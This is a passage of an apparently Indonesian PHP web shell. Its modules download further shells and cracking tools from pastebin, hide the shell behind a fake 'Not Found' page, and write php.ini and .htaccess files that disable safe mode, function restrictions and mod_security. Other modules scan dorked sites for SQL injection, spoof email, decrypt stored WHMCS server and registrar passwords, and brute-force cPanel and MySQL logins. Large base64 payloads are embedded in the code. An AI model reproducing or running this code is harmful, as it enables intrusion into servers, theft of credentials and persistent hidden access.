ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
chmod("python.izo",0755);
echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
</div>"; }


////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'whm')) {
$file = file_get_contents('http://pastebin.com/raw.php?i=Bayu8UGw');
$IIIIIIIIl11I = fopen('whm.php','w');
fwrite($IIIIIIIIl11I,$file);
fclose($IIIIIIIIl11I);
print '<br>
<center><blink><b>Tools siap diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="whm.php" target="_blank"> whm.php</a> ] </b></center>';
}

////////////////////////////


elseif(isset($_GET['x']) && ($_GET['x'] == 'interface'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=interface" method="post">
<br>
<?php
echo "<center/>";
  mkdir('mysql', 0755);
    chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$mysql = file_get_contents('http://pastebin.com/raw.php?i=WTMcpKdT');
$file = fopen("mysql.php" ,"w+");
$write = fwrite ($file ,($mysql));
fclose($file);
    chmod("mysql.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=mysql/mysql.php width=97% height=100% frameborder=0></iframe>"; 
}

/////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'cpfind'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cpfind" method="post">
<br>
<?php
echo "<center/>";
  mkdir('cpfind', 0755);
    chdir('cpfind');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$cpfind = file_get_contents('http://pastebin.com/raw.php?i=xeXhp0wp');
$file = fopen("cpfind.php" ,"w+");
$write = fwrite ($file ,($cpfind));
fclose($file);
    chmod("cpfind.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=cpfind/cpfind.php width=97% height=100% frameborder=0></iframe>"; 
}
/////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'wso25')) { 
$file = file_get_contents('http://pastebin.com/raw.php?i=WzKKMmth');
$IIIIIIIIl11I = fopen('css.php','w');
fwrite($IIIIIIIIl11I,$file);
fclose($IIIIIIIIl11I);
print '<br>
<center><blink><b>Tools siap diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="css.php" target="_blank"> css.php</a> ] </b></center>';
}	

////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'Cleaner')) { 
$file = file_get_contents('http://pastebin.com/raw.php?i=YdX7RjGE');
$IIIIIIIIl11I = fopen('clean.php','w');
fwrite($IIIIIIIIl11I,$file);
fclose($IIIIIIIIl11I);
print '<br>
<center><blink><b>Klik Disini....</blink><br><br>[ <a href="clean.php" target="_blank"> clean.php</a> ] </b></center>';
}	
///////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'rootbrute'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=rootbrute" method="post">
<br>
<?php
echo "<center/>";
  mkdir('rootbrute', 0755);
    chdir('rootbrute');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$rootbrute = file_get_contents('http://pastebin.com/raw.php?i=CT4rJiP2');
$file = fopen("rootbrute.php" ,"w+");
$write = fwrite ($file ,($rootbrute));
fclose($file);
    chmod("rootbrute.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=rootbrute/rootbrute.php width=97% height=100% frameborder=0></iframe>"; 
}
////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'whmkill'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=whmkill" method="post">
<br>
<?php
echo "<center/>";
  mkdir('whmkill', 0755);
    chdir('whmkill');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$whmkill = file_get_contents('http://pastebin.com/raw.php?i=8CmTkm3R');
$file = fopen("whmkill.php" ,"w+");
$write = fwrite ($file ,($whmkill));
fclose($file);
    chmod("whmkill.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=whmkill/whmkill.php width=97% height=100% frameborder=0></iframe>"; 
}


///////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'bdscan'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=bdscan" method="post">
<br>
<?php
echo "<center/>";
  mkdir('bdscan', 0755);
    chdir('bdscan');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$bdscan = file_get_contents('http://pastebin.com/raw.php?i=R9SVsqbV');
$file = fopen("bdscan.php" ,"w+");
$write = fwrite ($file ,($bdscan));
fclose($file);
    chmod("bdscan.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
$safemode = fopen("php.ini" ,"w+");
$data = 'c2FmZV9tb2RlPU9GRgpkaXNhYmxlX2Z1bmN0aW9ucz1OT05F';
$tulis = fwrite( $safemode, base64_decode($data));
fclose($safemode);
   echo "<iframe src=bdscan/bdscan.php width=97% height=100% frameborder=0></iframe>"; 
}

/////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'passlist'))
{	
?>
<br><br><br>
  <center><div id="Open"><a onClick="window.open('http://aerulcyber.biz/word.lst','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://pastebin.com/raw.php?i=HTH4m1DQ">Open</a></center>
<?php
}

/////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'sqli-scanner'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sqli-scanner" method="post">
<?php
echo '<br><br><center><form method="post" action=""><b><font color="green">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:#00ff00;background-color:#000000" size="20"/><input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan"></form></center>';
ob_start();
set_time_limit(0);
if (isset($_POST['scan'])) {
$browser = $_SERVER['HTTP_USER_AGENT'];
$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';
for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);
preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){
$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl);
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT *
FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) {
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln
Found..</font></b></center>';
ob_flush();flush();
}else{
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
if(isset($_POST['uploadcomp'])){
if(is_uploaded_file($_FILES['file']['tmp_name'])){
$path = magicboom($_POST['path']);
$fname = $_FILES['file']['name'];
$tmp_name = $_FILES['file']['tmp_name'];
$pindah = $path.$fname;
$stat = @move_uploaded_file($tmp_name,$pindah);
if ($stat) {
$msg = "file uploaded to $pindah";
}
else $msg = "failed to upload $fname";
}
else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){
$pilihan = trim($_POST['pilihan']);
$wurl = trim($_POST['wurl']);
$path = magicboom($_POST['path']);
$namafile = download($pilihan,$wurl);
$pindah = $path.$namafile;
if(is_file($pindah)) {
$msg = "file uploaded to $pindah";
}
else $msg = "failed to upload $namafile";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from computer</th></tr>
<tr><td colspan="2"><p style="text-align:center;"><input style="color:#FFFFFF;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr>
</table></form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr><th colspan="2">Upload from url</th></tr>
<tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }



///////////////////////////////////////////////////////
 elseif(isset($_GET['x']) && ($_GET['x'] == 'safemode'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=safemode" method="post">

<?php

echo "<html>
<center><br><br>
<font color=#FF0000 > Nonaktifkan Safe Mode dan Clear Nonaktifkan Fungsi penggunakan php.ini </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='phpinisafemode' value='$pwd' style='color:#FF0000;background-color:#000000' /><br> 
<input type='submit' name='dsmsubmit' style='color:#FF0000;background-color:#000000' value='Create PHP.INI' />
</form>
<br><br>
<font color=#FF0000 > Nonaktifkan Safe Mode dan Clear Nonaktifkan Fungsi penggunakan Htaccess </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='htaccesssafemode' style='color:#FF0000;background-color:#000000' value='$pwd' /><br>
<input type='submit' name='omssubmit' style='color:#FF0000;background-color:#000000' value='Create .HTACCESS' />
</form>";
$dirphpini = $_POST['phpinisafemode'];
$dirhtaccess = $_POST['htaccesssafemode'];
$phpininamelol = "php.ini";

if($_POST['omssubmit'])
{
 $fse=fopen("$dirphpini.htaccess","w");
 fwrite($fse,'<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
echo "<script>alert('.htaccess has been successfully created'); hideAll();</script>";
 fclose($fse);
}

else if ($_POST['dsmsubmit'])
{
$fse=fopen("$dirhtaccess$phpininamelol","w");
fwrite($fse,'safe_mode=OFF
disable_functions=NONE');
echo "<script>alert('php.ini has been successfully created'); hideAll();</script>";
fclose($fse);
}
}

///////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'mail'))
{
if(isset($_POST['mail_send']))
{
$mail_to = $_POST['mail_to'];
$mail_from = $_POST['mail_from'];
$mail_subject = $_POST['mail_subject'];
$mail_content = magicboom($_POST['mail_content']);
if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from"))
{ $msg = "email sent to $mail_to"; }
else $msg = "send email failed";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
<table class="cmdbox">
<tr>
<td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey admin, please patch your site :)</textarea>
</td>
</tr>
<tr>
<td>
&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somevictim.com" name="mail_to" />&nbsp; mail to
</td>
</tr>
<tr>
<td>
&nbsp;<input class="inputz" style="width:20%;" type="text" value="aerul@hackermail.com" name="mail_from" />
&nbsp; from
</td>
</tr>
<tr>
<td>
&nbsp;<input class="inputz" style="width:20%;" type="text" value="Hello!" name="mail_subject" />&nbsp; subject
</td>
</tr>
<tr>
<td>
&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" />
</td>
</tr>
<tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?>
</td>
</tr>
</table>
</form>
<?php
}

///////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcsdec'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=whmcsdec" method="post">

<?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br><center><font size='5' color='#FFFFFF'><b>+--==[ WHMCS Decoder ]==--+</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FFFFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FFFFFF;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
///////////////////////////////////////////////////////////////////////////

 elseif(isset($_GET['x']) && ($_GET['x'] == 'cpbrute'))
			{	
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=cpbrute" method="post">
			<?php
			//bruteforce
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php

@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Aerul~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>Yea motherfocker, Found <font color=green>$ok</font> Cpanel!!</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
//mail("aeruldawhitehkc@gmail.com","Cpanel Bruteforce","IP : $i \n | Host : $h \n | Dir : $dir \n ");
$back = "c2FmZV9tb2RlID0gT2ZmCmRpc2FibGVfZnVuY3Rpb25zID0gTm9uZQpzYWZlX21vZGVfZ2lkID0gT0ZGCm9wZW5fYmFzZWRpciA9IE9GRgphbGxvd191cmxfZm9wZW4gPSBPbg==";
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($back));
fclose($file);
chmod("php.ini",0755);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGl